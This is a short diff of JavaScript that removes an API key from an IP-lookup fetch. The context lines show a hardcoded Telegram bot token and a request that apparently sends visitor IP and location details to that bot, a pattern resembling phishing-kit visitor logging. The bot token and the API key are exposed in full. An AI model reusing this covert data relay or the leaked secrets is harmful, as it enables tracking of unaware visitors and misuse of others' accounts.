@@ -24,7 +24,7 @@ var Welcome = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhM
 var oReq = new XMLHttpRequest(); 
 oReq.open("GET", Welcome, true); 
 oReq.send();
-fetch("https://api.ipbase.com/json/?apikey=13841960-bf98-11ec-bdc4-5134c1fdde2f") //?apikey=13841960-bf98-11ec-bdc4-5134c1fdde2f
+fetch("https://api.ipbase.com/json/") //?apikey=13841960-bf98-11ec-bdc4-5134c1fdde2f
 	.then((res) => res.json())
 	.then((data) => {
 		var output = `
